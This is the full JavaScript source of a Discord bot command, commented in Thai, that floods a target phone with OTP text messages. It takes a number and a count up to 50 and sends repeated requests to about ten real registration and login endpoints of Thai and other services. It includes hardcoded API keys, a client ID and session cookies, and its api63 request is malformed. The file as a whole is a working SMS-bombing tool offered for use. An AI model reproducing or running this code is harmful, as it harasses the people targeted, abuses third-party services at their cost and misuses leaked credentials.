const axios = require('axios');
const { AttachmentBuilder } = require('discord.js'); // ใช้ AttachmentBuilder

module.exports = {
    name: '!ยิงเบอร์',
    description: 'ยิง OTP ไปที่เบอร์โทรศัพท์ที่ระบุ',
    async execute(message, args) {
        const phoneNumber = args[0];
        const count = args[1];

        // ถ้าผู้ใช้พิมพ์คำสั่งผิด
        if (!phoneNumber || !count) {
            const exampleImage = new AttachmentBuilder('https://img2.pic.in.th/pic/28682534.gif');  // เปลี่ยนลิงก์เป็น GIF
            return message.reply({
                content: "กรุณากรอกคำสั่งให้ถูกต้อง เช่น `!ยิงเบอร์ 0891234567 5`\n**ตัวอย่าง:** `!ยิงเบอร์ <เบอร์> <จำนวน>`",
                files: [exampleImage] // รูปที่จะแสดง
            });
        }

        if (isNaN(count) || count <= 0 || count > 50) {
            return message.reply("จำนวนที่กรอกต้องเป็นตัวเลขที่มากกว่า 0 และไม่เกิน 50");
        }

        const userAgent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36";

        // ฟังก์ชันสำหรับ API ใหม่ที่คุณให้มา
        async function api63(phone) {
            await axios.post(
                "https://api.monkeyeveryday.com/graphql",
                {
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                        "content-type": "application/json"
                    },
                    json: {
                        operationName: "requestRegistrationOtp",
                        variables: {
                            phone: phone
                        },
                        query: "mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"
                    }
                }
            );
        }

        // ส่ง OTP ไปที่เบอร์โทรศัพท์
        for (let i = 0; i < parseInt(count); i++) {
            try {
                // ใช้ Promise.all เพื่อให้ API ทำงานพร้อมกัน
                await Promise.all([
                    axios.post('https://api2.1112.com/api/v1/otp/create', 
                        { 
                            phonenumber: phoneNumber, 
                            language: 'th' 
                        },
                        { headers: { 'User-Agent': userAgent } }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post("https://api.1112delivery.com/api/v1/otp/create", 
                        { phonenumber: phoneNumber, language: "th" },
                        { headers: { "User-Agent": userAgent } }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post("https://login.s-momclub.com/accounts.otp.sendCode", 
                        `phoneNumber=%2B66${phoneNumber.slice(1)}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json`, 
                        {
                            headers: {
                                "content-type": "application/x-www-form-urlencoded",
                                "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
                                "cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"
                            }
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post("https://u.icq.net/api/v65/rapi/auth/sendCode", 
                        {
                            "reqId": "39816-1633012470",
                            "params": {
                                "phone": `+66${phoneNumber.slice(1)}`,
                                "language": "en-US",
                                "route": "sms",
                                "devId": "ic1rtwz1s1Hj1O0r",
                                "application": "icq"
                            }
                        },
                        {
                            headers: {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
                            }
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post("http://b226.com/x/code", 
                        { phone: phoneNumber }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post("https://api.myfave.com/api/fave/v3/auth", 
                        { phone: `66${phoneNumber.slice(1)}` }, 
                        { 
                            headers: { 
                                "client_id": "dd7a668f74f1479aad9a653412248b62" 
                            }
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    // เพิ่ม API ใหม่ที่คุณให้มา
                    axios.post('https://api.gentlewomanonline.com/public/5e3548c2d32cb12606a34fb8/sms/otp', 
                        { 
                            'to': phoneNumber,
                            'from': 'GENTLEWOMENT'
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post('https://openapi.bigc.co.th/customer/v1/otp', 
                        {
                            'phone_no': phoneNumber
                        },
                        {
                            headers: {
                                'accept': 'application/json, text/plain, */*',
                                'content-type': 'application/json',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
                            }
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    axios.post('https://api-sso.ch3plus.com/user/request-otp', 
                        {
                            'tel': phoneNumber,
                            'type': 'register'
                        },
                        {
                            headers: {
                                'accept': 'application/json, text/plain, */*',
                                'content-type': 'application/json',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
                            }
                        }
                    ).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`)),

                    // เพิ่มฟังก์ชัน API63 ใหม่
                    api63(phoneNumber).then(() => console.log(`ยิงไปที่ ${phoneNumber} สำเร็จ`))
                ]);
            } catch (error) {
                console.error('Error during OTP request:', error);

                // ส่ง GIF เมื่อเกิดข้อผิดพลาด
                const errorGif = new AttachmentBuilder('https://img2.pic.in.th/pic/01-42-31-422_512.gif');
                message.reply({
                    content: "กรุณาลองใหม่อีกครั้ง",
                    files: [errorGif]
                });
                return;
            }
        }

        // สถานะความแรง (แบบที่ขยับได้)
        let statusMessage = await message.reply("📶 กำลังส่ง OTP... สถานะความแรง: 0%");
        let percentage = 0;

        const interval = setInterval(() => {
            percentage += 2; // เพิ่มเปอร์เซ็นต์ความแรง
            if (percentage >= 100) {
                percentage = 100;
                clearInterval(interval);
            }
            statusMessage.edit(`📶 กำลังส่ง OTP... สถานะความแรง: ${percentage}%`);
        }, 100);

        message.reply(`✅ ส่ง OTP ไปที่เบอร์ ${phoneNumber} จำนวน ${count} ครั้ง!`);
    }
};
